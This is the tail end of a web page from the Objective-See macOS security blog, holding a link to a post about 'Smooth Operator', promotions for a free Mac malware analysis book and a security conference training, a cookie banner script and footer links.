<br>
<center>
    <a class="inlineLink" href="https://objective-see.org/blog/blog_0x74.html">Ironing out (the macOS) details of a Smooth Operator (Part II)</a>
</center>
</div>
<br>
<br>
<div class="note">
<b><span style="font-size: 20px;">Interested in Mac Malware Analysis Techniques?</span></b>
<br>
<br>
<table style="border: 0px;">
  <tr>
    <td style="border: 0px;">
      <img style="border-radius: 15px;" src="../images/blog/blog_0x6B/book.png" width="300px;">
    </td>
    <td style="border: 0px; font-size: 17px;" width="75%";>
    You're in luck, as I've written a book on this topic! It's 100% free online while all royalties from sale of the printed version donated to the Objective-See Foundation.
    <br>
    <br>
  <center>
  <a class="inlineLink" href="https://taomm.org">The Art Of Mac Malware, Vol. 0x1: Analysis</a>
  </center>
  </td>
  </tr>
  <tr>
    <td style="border: 0px;">&nbsp;</td>
    <td style="border: 0px;">&nbsp;</td>
  </tr>
  <tr>
    <td style="border: 0px;">
      <img style="border-radius: 15px;" src="https://objectivebythesea.org/v6/images/speakers/Patrick%20Wardle.png" height="300px;">
    </td>
    <td style="border: 0px; font-size: 17px;" width="75%";>
    Or, come attend our macOS security conference, "<a class="inlineLink" href="https://objectivebythesea.org/v6/index.html">Objective by the Sea</a>" v6.0 in sunny Spain! ...where I'm teaching a class on Mac Malware Detection &amp; Analysis
    <br>
    <br>
  <center>
    Sign up for the 
  <a class="inlineLink" href="https://objectivebythesea.org/v6/taomm.html">The Art of Mac Malware</a> training. 
  </center>
  </td>
  </tr>
</table>
</div>
</section>

    </div>

    
<script src="/js/cookies.js"></script>
<script src="/social/ss-social.js"></script>
<link href="/social/ss-social.css" rel="stylesheet" />

<script> 
    $(function(){
        
        
        
        if("" == getCookie("acceptedCookies")) 
        {
            document.getElementById("cookies").style.display = "block";
        }

    });
</script>

<script>
function acceptCookies() {

    
    setCookie("acceptedCookies", "yes", 365);

    
    document.getElementById("cookies").style.display = "none";
}
</script>

<br>
<br>
<div id="cookies" class="cookie" style="padding-left:20px;">
    This website uses cookies to improve your experience.
    <div class="cookieButton">
        
        <button class="menuicon button-4" role="button" onclick="acceptCookies()" style="margin-top: 12px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Okay!</button>
    </div>
</div>
<nav role="footer">
<ul>

    <li>
        <a href="mailto:contact@objective-see.com" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#x2709;</span></a>
    </li>

     <li>
        <a href="rss.xml" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xE310;</span></a>
    </li>

    <li>
        <a href="https://www.youtube.com/channel/UCQycc8VDhHuNkZlKSSTDHzw" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xF630;</span></a>
    </li>
   
    <li>
        <a href="https://twitter.com/objective_see" class="menubutton icon"><span class="ss-icon">&#xF611;</span></a>
    </li>
    
    <li>
         <form action="/support.html" style="display: inline;">
            <button class="menuicon button-4" role="button" style="margin-top: 7px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Support Us!</button>
        </form>
        
    </li>

    <li>
        <div style="margin-top: 10px;">
        Signup for our <a class="inlineLink" target="_blank" href="http://eepurl.com/bXpXeT">newsletter </a> »
        </div>
    </li>

</ul>
</nav>

  </body>

</html>